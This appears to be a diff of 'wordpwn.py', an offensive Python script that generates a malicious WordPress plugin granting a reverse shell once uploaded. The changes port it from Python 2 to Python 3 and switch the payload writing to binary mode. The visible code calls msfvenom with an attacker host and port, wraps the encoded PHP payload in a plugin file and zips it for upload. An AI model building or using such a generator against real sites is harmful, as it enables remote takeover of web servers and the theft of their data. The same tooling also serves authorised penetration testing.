@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 #
 # Script name     : wordpwn.py
-# Version         : 2.1
+# Version         : 2.2
 # Created date    : 3/1/2017
-# Last update     : 25/02/2020
+# Last update     : 30/05/2020
 # Author          : wetw0rk & 3isenHeiM
 # Inspired by     : Metasploit admin shell upload
-# Python version  : 2.7
+# Python version  : 3.7
 # Description     : Simply generates a wordpress plugin that will grant you a reverse shell
 #                   once uploaded. I reccomend installing Kali Linux, as msfvenom is used
 #                   to generate the payload.
@@ -65,12 +65,10 @@ def generate_plugin(LHOST, LPORT, PAYLOAD):
 		['msfvenom', '-p', PAYLOAD, LHOST, LPORT,
 		'-e', 'php/base64', '-f', 'raw'], stdout=subprocess.PIPE).communicate()[0]
 	# Write Our Payload To A File
-	payload_file = open('wetw0rk_maybe.php', 'w')
-	payload_file.write("<?php ")
-	payload_file.close()
-	payload_file = open('wetw0rk_maybe.php','a')
+	payload_file = open('wetw0rk_maybe.php', 'wb')
+	payload_file.write(b"<?php ")
 	payload_file.write(create_payload)
-	payload_file.write(" ?>")
+	payload_file.write(b" ?>")
 	payload_file.close()
 	# Create Zip With Payload
 	print("[+] Writing files to zip")
